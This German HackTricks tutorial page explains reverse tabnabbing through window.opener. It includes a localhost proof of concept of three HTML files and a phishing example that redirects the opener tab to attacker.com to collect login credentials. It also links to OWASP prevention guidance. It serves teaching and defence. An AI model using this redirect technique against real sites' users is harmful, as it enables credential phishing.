<details>

<summary><strong>Lernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks bewerben m√∂chten** oder **HackTricks als PDF herunterladen m√∂chten**, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **GitHub-Repositories** senden.

</details>


# Beschreibung

In einer Situation, in der ein **Angreifer** das **`href`**-Argument eines **`<a`**-Tags mit dem Attribut **`target="_blank" rel="opener"`** kontrollieren kann, das von einem Opfer angeklickt wird, kann der **Angreifer** diesen **Link** auf eine von ihm kontrollierte Webseite (eine **b√∂sartige** **Website**) verweisen. Sobald das Opfer den Link anklickt und die Webseite des Angreifers aufruft, kann diese **b√∂sartige** **Website** die **urspr√ºngliche** **Seite** √ºber das JavaScript-Objekt **`window.opener`** kontrollieren.\
Wenn die Seite kein **`rel="opener"` enth√§lt, aber `target="_blank"` enth√§lt und auch kein `rel="noopener"` hat, k√∂nnte sie ebenfalls anf√§llig sein.

Eine √ºbliche Methode, um dieses Verhalten auszunutzen, besteht darin, die Position der urspr√ºnglichen Webseite √ºber `window.opener.location = https://attacker.com/victim.html` zu √§ndern, um auf eine vom Angreifer kontrollierte Webseite zu verweisen, die **wie die urspr√ºngliche aussieht**, damit sie das **Anmeldeformular** der urspr√ºnglichen Webseite imitieren und nach Anmeldeinformationen des Benutzers fragen kann.

Beachten Sie jedoch, dass der **Angreifer nun das Fensterobjekt der urspr√ºnglichen Webseite kontrollieren kann**, und er kann es auf andere Weise missbrauchen, um **heimlichere Angriffe** durchzuf√ºhren (vielleicht durch Modifizierung von JavaScript-Ereignissen, um Informationen an einen von ihm kontrollierten Server zu exfiltrieren?).

# √úbersicht

## Mit R√ºckverweis

Verbindung zwischen Eltern- und Kindseiten, wenn das Pr√§ventionsattribut nicht verwendet wird:

![https://owasp.org/www-community/assets/images/TABNABBING_OVERVIEW_WITH_LINK.png](https://owasp.org/www-community/assets/images/TABNABBING\_OVERVIEW\_WITH\_LINK.png)

## Ohne R√ºckverweis

Verbindung zwischen Eltern- und Kindseiten, wenn das Pr√§ventionsattribut verwendet wird:

![https://owasp.org/www-community/assets/images/TABNABBING_OVERVIEW_WITHOUT_LINK.png](https://owasp.org/www-community/assets/images/TABNABBING\_OVERVIEW\_WITHOUT\_LINK.png)

## Beispiele <a href="#examples" id="examples"></a>

Erstellen Sie die folgenden Seiten in einem Ordner und starten Sie einen Webserver mit `python3 -m http.server`\
Rufen Sie dann `http://127.0.0.1:8000/`vulnerable.html **auf**, **klicken** Sie auf den Link und beachten Sie, wie sich die **URL** der **urspr√ºnglichen** **Website** **√§ndert**.

{% code title="vulnerable.html" %}
```markup
<!DOCTYPE html>
<html>
<body>
<h1>Victim Site</h1>
<a href="http://127.0.0.1:8000/malicious.html" target="_blank" rel="opener">Controlled by the attacker</a>
</body>
</html>
```
{% code title="b√∂sartig.html" %}
```markup
<!DOCTYPE html>
<html>
<body>
<script>
window.opener.location = "http://127.0.0.1:8000/malicious_redir.html";
</script>
</body>
</html>
```
{% code title="b√∂sartige_weiterleitung.html" %}
```markup
<!DOCTYPE html>
<html>
<body>
<h1>New Malicious Site</h1>
</body>
</html>
```
{% endcode %}

## Zug√§ngliche Eigenschaften <a href="#accessible-properties" id="accessible-properties"></a>

Im Szenario eines **Cross-Origin**-Zugriffs (Zugriff √ºber verschiedene Domains hinweg) sind die Eigenschaften der **window**-JavaScript-Klasseninstanz, auf die von einer b√∂sartigen Website zugegriffen werden kann und die vom **opener**-JavaScript-Objektverweis verwiesen wird, auf die folgenden beschr√§nkt:

- **`opener.closed`**: Diese Eigenschaft wird abgefragt, um festzustellen, ob ein Fenster geschlossen wurde, und gibt einen booleschen Wert zur√ºck.
- **`opener.frames`**: Diese Eigenschaft erm√∂glicht den Zugriff auf alle iframe-Elemente im aktuellen Fenster.
- **`opener.length`**: Diese Eigenschaft gibt die Anzahl der im aktuellen Fenster vorhandenen iframe-Elemente zur√ºck.
- **`opener.opener`**: √úber diese Eigenschaft kann eine Referenz auf das Fenster abgerufen werden, das das aktuelle Fenster ge√∂ffnet hat.
- **`opener.parent`**: Diese Eigenschaft gibt das √ºbergeordnete Fenster des aktuellen Fensters zur√ºck.
- **`opener.self`**: √úber diese Eigenschaft wird der Zugriff auf das aktuelle Fenster selbst erm√∂glicht.
- **`opener.top`**: Diese Eigenschaft gibt das oberste Browserfenster zur√ºck.

In F√§llen, in denen die Domains identisch sind, erh√§lt die b√∂sartige Website Zugriff auf alle von der [**window**](https://developer.mozilla.org/en-US/docs/Web/API/Window)-JavaScript-Objektreferenz bereitgestellten Eigenschaften.

# Pr√§vention

Informationen zur Pr√§vention sind in der [HTML5 Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/HTML5\_Security\_Cheat\_Sheet.html#tabnabbing) dokumentiert.

## Referenzen

* [https://owasp.org/www-community/attacks/Reverse_Tabnabbing](https://owasp.org/www-community/attacks/Reverse_Tabnabbing)




<details>

<summary><strong>Lernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks bewerben m√∂chten** oder **HackTricks als PDF herunterladen m√∂chten**, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories senden.

</details>
